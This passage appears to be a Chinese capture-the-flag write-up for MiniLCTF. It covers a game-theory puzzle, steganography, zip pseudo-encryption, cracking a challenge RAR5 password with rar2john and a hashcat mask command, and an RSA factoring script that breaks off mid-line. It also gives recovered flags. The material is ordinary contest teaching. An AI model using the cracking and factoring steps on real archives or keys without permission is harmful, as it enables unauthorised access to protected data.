<code>9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV</code>  就使 flag 的加密，慢慢尝试就行了</p>\n<ol>\n<li>\n<h2 id=\"抓猫猫\"><a class=\"anchor\" href=\"#抓猫猫\">#</a> 抓猫猫</h2>\n</li>\n</ol>\n<p>抓堆问题：博弈论的数学问题....</p>\n<p><code>有一堆谷粒（例如100粒），甲乙轮流抓，每次可抓1-5粒，甲先抓，规定谁抓到最后一把谁赢。甲应该如何抓？为什么？ 先不考虑100粒的问题，假如谷粒只有一粒，甲一次就可以抓完，直接获胜。两粒，三粒，四粒，五粒也是同样的情况。但是如果谷粒有六粒的话，甲一次性无法抓完，乙必然会赢。 那怎么样甲才能稳赢呢，就是在最后只剩六个谷粒的时候让乙先抓取，在最开始取时甲就要将剩下的谷粒数限定在六的倍数内，只要甲取完每次都是六的倍数，甲就必胜了。</code></p>\n<h3 id=\"k倍博弈\"><a class=\"anchor\" href=\"#k倍博弈\">#</a> k 倍博弈</h3>\n<p>两个人取一堆 n 的石子，先手不能全部取完，之后每人取的个数不能超过另一个人上轮取的 K 倍。</p>\n<p>当 k=1 时，必败态都是 2<sup>i, 我们可以借助二进制的思想来理解，将 n 表示为 2 进制，先手拿掉最后一个 1，后手肯定没法去掉更高位的 1，所以后手取完，先手至少还能拿掉最后一个 1，所以先手必胜。当 n=2</sup>i 时，先手必败，因为此时 n 的二进制只有一个 1，先手第一次不能取完，所以先手取了以后，后手一定能取到最后一个 1，然后先手不能去掉更高位的 1，所以先手必败。</p>\n<p>假设 <code>n=6(110)</code> ，我们先去掉最后一个 1，变为 4（100），此时如果对手取两个，那么我们直接去两个就能取完，如果对手取一个，还剩 3 个，我们能取到最后一个。</p>\n<p>当 k=2 时，这就是一个 Fibonacci 博弈，可知先手必胜当且仅当 n 不为 Fibonacci 数，还是利用，先手取掉最后一个 1，后手无法去掉更高位的 1，所以后手取完，先手至少还能拿掉最后一个 1。Fibonacci 数列有一个很好的性质就是，任何一个整数都可以表示为若干项不连续的 Fibonacci 数，所以我们先去掉最后一个 1，即一个数 x，后手肯定无法去掉更高的数 2x，小于高两位的 1，所以后手无法取完。</p>\n<p>假设 <code>n=11=7+3+1</code> ，表示为 10101，我们先手去掉最后一个 1，后手无法去掉高两位的 1，所以后手取完，我们至少还能去掉最后一个 1。</p>\n<p>当 k 的时候，想办法构造数列，使得数列的任意两项之间的倍数大于 k。</p>\n<p>就像 Fibonacci 博弈一样，我们还是想要构造一个想 Fibonacci 一样的数列，我们用 a 数组，表示要构造的数列， <code>b[i]</code>  表示 <code>a[1..i]</code>  所能组成的最大数，为了方便理解，我们还是用 Fibonacci 数列举例子，显然 <code>a[ ]=&#123;1,2,3,5,8...&#125;</code> , <code>b[3]=4</code> , 因为 5 本身就是 Fibonacci 数，而 <code>6=1+2+3</code> ，相邻两项的倍数根本就不大于 <code>2</code> ， <code>6=1+5</code> ， <code>b[4]=6</code> 。所以 b 数组中的数时我们要构造的数列中的一些满足要求的数的和， <code>a[i]=b[i-1]+1</code> , 为什么呢，因为 <code>a[i]</code>  中的数是不可构造的，因为取到它就是必败。而 <code>b[i-1]</code>  是 <code>a[1..i-1]</code>  所能构造的最大数，那么加 1，就是无法被前面的数列构造出来，所以只能另外开一项。</p>\n<p>关于 <code>b[i]</code>  的构造，由于 <code>b[i]</code>  是 <code>a[1..i]</code>  中的数构造出来的，所以我们一定会用到 <code>a[i]</code> , 不然就成了 <code>b[i-1]</code>  了，所以我们先要按递减顺序找到 <code>a[t]*k&lt;a[i]</code> , 那么 <code>b[i]=b[t]+a[i]</code> , 如果前面找不到那么 <code>b[i]=a[i]</code> , 为什么呢，因为前面的数没有 k 项或者说构造出来太小了，所以只能选取一个，那么肯定选取最大的哪一个，前面 <code>a[1...i-1]</code>  所构造的项 <code>b[i-1]</code>  小于 <code>a[i]</code> , 所以这种情况下 <code>b[i]=a[i]</code> 。所以我们先手能不能必胜就看 n 在不在这个 <code>a[ ]</code>  数组里面，给出模板</p>\n<p>所以这里我们由于抓猫的数量不能超过前一次抓猫的数量，所以在猫猫数量为偶数时不能抓奇数只猫猫，否则对方只抓一只猫猫我们就输了。 所以我们需要找出一个偶数，使得我们抓完后剩余的猫猫数为该偶数的倍数即可抓住猫猫</p>\n<p>假若说他先抓了 32 只猫猫，剩下了 108 只猫猫，我发现我抓 12 只的话还剩 96 只，96 是 12 的倍数。这个时候他抓 12，我也抓 12，他抓 8 我就抓 4，他抓 10 我就抓 2，他抓 6，我就 6，他抓 4 我就 4，他抓 2 我就 2，就稳赢。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;cstdio></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>using namespace std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> maxn<span class=\"token operator\">=</span><span class=\"token number\">1000000</span><span class=\"token operator\">+</span><span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">[</span>maxn<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 构造的数列</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span>maxn<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//b [i] 为 a [1..i] 所能凑出的最大数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d %d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>k<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//a [i] 为 a [1..i-1] 所能构造出的最大的那个数 + 1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>k<span class=\"token operator\">&lt;</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 寻找临界点</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>k<span class=\"token operator\">&lt;</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//a [1..j] 所能构造出来的最大值加上 a [i]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">else</span> b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 相邻  小于了 K 倍 自然构造的最大的数就是 a [i] 了</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>n<span class=\"token punctuation\">)</span>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lost\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 如果数列 a 中有 n 则先手必败</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Win\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上面都是理论，看看就行。</p>\n<h3 id=\"再看出题人的意思\"><a class=\"anchor\" href=\"#再看出题人的意思\">#</a> 再看出题人的意思 **</h3>\n<pre><code class=\"language-文本\">题意：\n\n两个人轮流抓猫。初始有 n 只猫，第一次最少抓 1 只，最多抓 n - 1 只。之后的每轮至少抓 1 只，至多不能超过上一次抓的数量。抓走最后一只猫的人胜利。电脑先抓且保证第一次抓不是最优解。\n\n先上结论：n 是 2 的幂时后手必胜，否则先手必胜\n\n证明：\n\n考虑这个数的最低二进制位，即 lowbit ，例如 6 的 lowbit 是 2 ，12 的 lowbit 是 4\n\n现在拿走 n 的 lowbit ，记为 b，讨论对方的做法，记拿的数为 a\n\n① a = b\n\n易证剩下的数 n - 2b 的 lowbit 还是 b ，下一步可以再拿 b\n\n② a &lt; b\n\n由于 b 是 2 的幂，所以小于 b 且大于 1 的数必由小于 b 的二进制位组成\n\n易证剩下的数 n - a - b 的 lowbit 一定小于 b，所以下一步必定可以拿走更小的 lowbit\n\n因此每次必可以拿走当前数的 lowbit ，直至当前数为 1 为止，此时数的 lowbit 为自身，拿走即胜利\n\n需要注意的是，对方任何时候都不可能拿走剩下的所有数，因为 n - lowbit(n) &gt; lowbit(n)\n\n而当初始数为 2 的幂的时候，没有 lowbit 可拿（最多拿 n - 1 ），此时拿任何数都会导致对方出现可拿的 lowbit ，因此必败\n</code></pre>\n<h3 id=\"什么是二进制最低位\"><a class=\"anchor\" href=\"#什么是二进制最低位\">#</a> <strong>什么是二进制最低位</strong>？</h3>\n<p>首先要理解<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F1bnF1bnN0eWxlOTkvYXJ0aWNsZS9kZXRhaWxzLzgyNzE2OTkw\">二进制最低位</span>这个概念 ` 给出一个整数 A，输出它的最低位数<br />\n比如：A= 26，它的二进制形式为：11010，最低位为 10，所以应该输出 2<br />\n 再比如 A=92，它的二进制为：01011100，最低位为：100，所以应输出 4。其实就是转为二进制从右到左首先出现 1 的数。</p>\n<h3 id=\"尝试\"><a class=\"anchor\" href=\"#尝试\">#</a> <strong>尝试</strong></h3>\n<p>首先输入的不能为奇数，不然二进制最低位都是 1，电脑抓的猫猫就都为 1，一直偶数抓下去就必输。其次我们输入的偶数要让电脑抓的是奇数，然后我们输入 1，这样才能使剩余的为奇数，我们一直抓一直猫猫就必赢了。</p>\n<p>怎么才能使电脑抓的使奇数呢？</p>\n<p>就牵扯到二进制最低位了，举个列子，不用完全搞懂，实验是真理的唯一标准！</p>\n<h3 id=\"实验\"><a class=\"anchor\" href=\"#实验\">#</a> <strong>实验</strong></h3>\n<p>我的 XDU 一共是是 150 个猫猫，CDCQ 抓到 34 个猫猫，还剩 116 个。</p>\n<p>116 的二进制是 111 0100，所以他的最低位是 100，就是 2 的 2 次方为 4。</p>\n<p>所以我们输入二进制最低位 4，直接爆出奇数。</p>\n<p>其实用上面的公式也可以 n-1 为奇数，太抽象了。。。原理我这个数学渣渣也不知道</p>\n<p>n 是 2 的幂时，计算二进制位，就可以拿到 flag 了。</p>\n<ol>\n<li>\n<h2 id=\"好康的硬盘\"><a class=\"anchor\" href=\"#好康的硬盘\">#</a> 好康的硬盘</h2>\n</li>\n</ol>\n<p>文件 zip 打开 flag.txt 一看什么都没有就是零宽隐写也可以到 kali 的 vim 里面去验证</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMzMGsuZ2l0aHViLmlvL21pc2NfdG9vbHMvdW5pY29kZV9zdGVnYW5vZ3JhcGh5Lmh0bWw=\">解密网站</span>很多解密出来 <code>minil****</code></p>\n<p>rar5 用工具好像爆破不出来，用 kali 里面的 rar2john+hashcat。正巧上次用来爆破 word 文档密码。</p>\n<p><code>rar2john luoqian.rar</code>  生成 rar 的 hash 值保存在 test.hash 里面。注意是这个格式 <code>$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942</code></p>\n<p>然后用 <code>hashcat -m 13000 -a 3 test.hash minil?a?a?a?a </code>  慢慢跑。</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222222.jpg\" alt=\"\" /></p>\n<p>密码: <code>minil4396</code></p>\n<p>解压是个 img 镜像文件，因为不是取证，用看磁盘的工具就行，正巧我上次又下载了一个能搞硬盘的工具 (X-Ways Forensics) 打开</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvNDQ0NDQ=\">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</span> (1).png) 选择转为磁盘</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvNDQ0NDQ=\">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</span> (1).png) 选择分区 1 浏览即可</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639481727(1).jpg\" alt=\"\" /></p>\n<p>有两个可疑的文件，MP4 确实挺好看，但注意到了中间有几张图片。</p>\n<p>所以进行分离。正好 X-Ways Forensics 有自带的分离，点击 MP4 右击抽取连续的帧。从 0 开始，帧数有点多 9999 够了，其他的默认。慢慢找，一个图片里都有一个密码，全部找到就行了。</p>\n<p>密码： <code>7355608</code></p>\n<p>最后还有一个邮件，估计使用里面的内容解密 flag</p>\n<p>是一堆奇怪的英文。这个 txt 题目是奇怪的邮件，把内容全部往谷歌里一丢，找到<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BhbW1pbWljLmNvbS8=\">垃圾邮件隐写</span>。输入密码，解密就有 flag</p>\n<p><code>MiniLCTF&#123;n3ver_g0nna_L3t_Y0u_dowN&#125;</code></p>\n<ol>\n<li>\n<h2 id=\"recombination\"><a class=\"anchor\" href=\"#recombination\">#</a> Recombination</h2>\n</li>\n</ol>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222.jpg\" alt=\"\" /></p>\n<p>图片 zip 压缩包，改一下就行，伪加密 1 改成 0。</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/0000.jpg\" alt=\"\" /></p>\n<p>得到一串字符。尝试了转 16 进制，shellcode 等常规操作。无果。</p>\n<p>后来在一篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTE1Mjc2MTc2\"> DASCTF 三月赛的 WP</span> 中看到关于 aa3d 的内容，后来又搜到了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qb2huLWRvZS5mdW4vYnl0ZWN0Zi0yMDIwLW1pc2Mtd3JpdGV1cC8=\"> ByteCTF 2020 Misc WP</span>, 感觉字符串的重复情况相当类似。</p>\n<p>用 aa3d 试了一样的，字符串长度为 4559，那正好分解为 47*97 的矩阵。</p>\n<p>放在记事本里，截图。将截图用 stegsolve 打开，使用 <code>Analyze</code> &gt; <code>Stereogram Solver</code> ，调整图片位移，看到 flag：</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/111111.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/555555.jpg\" alt=\"\" /></p>\n<p>慢慢试就出来了。 <code>MiniL&#123;A@3d-1s_Ar7!!&#125;</code></p>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"asr\"><a class=\"anchor\" href=\"#asr\">#</a> asr</h2>\n<p>高低位一起 dfs 。shallow 之前的脚本拉出来改的。。。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    d <span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_p_q</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p_low <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    q_high <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    q_low <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p_high <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    maskx <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    maskn <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    si <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        x_lowbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> maskx<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> i</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        n_lowbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> maskn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tmppp_low <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        tmpqq_low <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        tmppp_high <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        tmpqq_high <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        x_highbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">511</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        n_highbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">1022</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p_low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">for</span> pp_low <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">for</span> qq_low <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token keyword\">for</span> pp_high <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        <span class=\"token keyword\">for</span> qq_high <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                            <span class=\"token keyword\">if</span> pp_low <span class=\"token operator\">^</span> qq_high <span class=\"token operator\">==</span> x_lowbits <span class=\"token keyword\">and</span> qq_low <span class=\"token operator\">^</span> pp_high <span class=\"token operator\">==</span> x_highbits<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                                temp1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pp_low <span class=\"token operator\">*</span> maskn <span class=\"token operator\">//</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p_low<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>qq_low <span class=\"token operator\">*</span> maskn <span class=\"token operator\">//</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> q_low<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> maskn </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                                temp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pp_high <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">511</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p_high<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>qq_high <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">511</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> q_high<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">1022</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>i<span class=\"token 